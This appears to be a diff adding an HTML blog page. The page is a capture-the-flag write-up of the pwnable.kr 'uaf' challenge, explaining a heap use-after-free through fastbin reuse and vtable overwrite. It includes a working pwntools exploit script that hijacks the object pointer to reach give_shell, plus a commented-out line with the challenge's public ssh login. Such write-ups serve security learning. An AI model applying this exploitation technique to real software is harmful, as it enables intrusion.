@@ -1,0 +1,121 @@
+<html>
+ <head>
+<title> Blog </title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+ <p style="color:white;font-size:2.2em;"> Blog </p>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> UAF vuln </h1>
+   
+ <br> 
+
+<p>
+This one was pretty simple all u have to do is Free once , allocate twice and Use once <br><br>
+The reason behind is as two objects (for men, woman ) are allocated of size 0x20
+</p>
+
+<img src="heap_dump.png" alt="" style="width:718px;height:247px;"><br><br>
+
+<p>
+<b>After free</b> both the chunks end's up in fastbin <br>
+U could closely look that woman object that was lastly free'd is the HEAD in the linked list <br>
+as fastbin follow's <b>LIFO</b> structure.  <br><br></p>
+
+<img src="fastbin_uaf.png" alt="" style="width:733px;height:300px;"><br><br>
+
+<p>if allocate a object now via <b>after</b> u end up in getting woman object address so we could trick now to change value in it <br>
+<b>use</b> this to call give_shell(a virtual function) <br>
+but unfortunately if choose to use , man object is called first  (but we modified woman object only ) <br>
+so to overcome this we call allocate again and now we can modify the man object :) <br>
+NOTE : i have used a plugin called libheap for gdb to debug heap 
+<br>
+</p>
+
+
+<code>
+from pwn import *
+context.bits = 64
+#s = ssh(host='pwnable.kr',user='uaf',password='guest',port=2222)
+payload = open('imp','w')
+give_shell = 0x401172
+shell_ptr = 0x401550 # man object  
+addr = pack(shell_ptr-8)
+payload.write(addr)
+payload.close()
+p = process(['./uaf','20','imp'])
+msg = p.recvlines(3)
+print msg 
+p.sendline('3') # free
+msg = p.recvlines(3)
+print msg
+p.sendline('2') # after 
+msg = p.recvlines(4)
+print msg
+p.sendline('2') # after 
+msg = p.recvlines(4)
+print msg
+p.sendline('1') # use
+p.interactive()
+</code>
+
+
+</body>
+</html>
